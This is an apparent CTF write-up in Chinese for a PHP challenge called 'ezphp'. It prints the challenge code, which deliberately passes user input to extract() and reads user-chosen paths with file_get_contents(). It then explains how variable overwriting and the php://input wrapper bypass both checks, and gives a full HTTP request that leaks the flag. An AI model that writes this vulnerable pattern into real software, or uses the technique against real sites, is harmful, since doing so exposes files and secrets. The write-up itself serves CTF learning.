# ezphp wp

本来是想考extract的两个知识点的，结果第二个知识点也可以解第一个知识，废了，非预期了

## 题目源码

```php
<?php
include 'flag.php';
extract($_GET);
if (isset($wsf)) {
    $xmm = trim(file_get_contents($zm));
    if ($xmm == $wsf) {
        if (!empty($xlq)) {
            $xw = trim(file_get_contents($fn));
            if ($xlq === $xw) {

                echo "<p>$flag</p>";
            } else {
                echo '<p>no no no </p>';
            }
        } else 'You cant do that!!';
    } else {
        echo 'hacker!!';
    }
} else {
    highlight_file(__FILE__);
}
?>

```

## 解题过程

这题逻辑很简单，想要拿到flag有两个要绕过

一个是`isset($wsf)`之后要`$xmm == $wsf`

一个是`!empty($xlq)`还要`$xlq === $xw`

其实这里为什么一个用isset一个用empty呢？

因为这里想考两个知识点，但是因为后面的empty是前者更严格的一种检查

所以能绕过后面的判断的肯定可以绕过前面的

第一个想考的其实是extract的利用

可以把`$wsf`设置为空，把`$zm`也设置为空，这样`$xmm`也为空

这样就绕过第一个空了

第二个则是php伪协议的利用

使用 php://input 伪协议绕过 

将要GET的参数?xxx=php://input 

然后用post方法传入值

## Payload

```http
POST /?wsf=&zm=&xlq=1&fn=php://input HTTP/1.1
Host: 127.0.0.1:1031
sec-ch-ua: ";Not A Brand";v="99", "Chromium";v="88"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Enctype: application/x-www-from-urlencoded
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 1

1
```

## Other

原本个人以为这应该是一道难度很巧妙的区分题的（区分会不会搜索

因为`file_get_contents`和`extract`都是被考烂了的知识点，随便一搜就一大堆文章

但是没想到最后才两解（哭死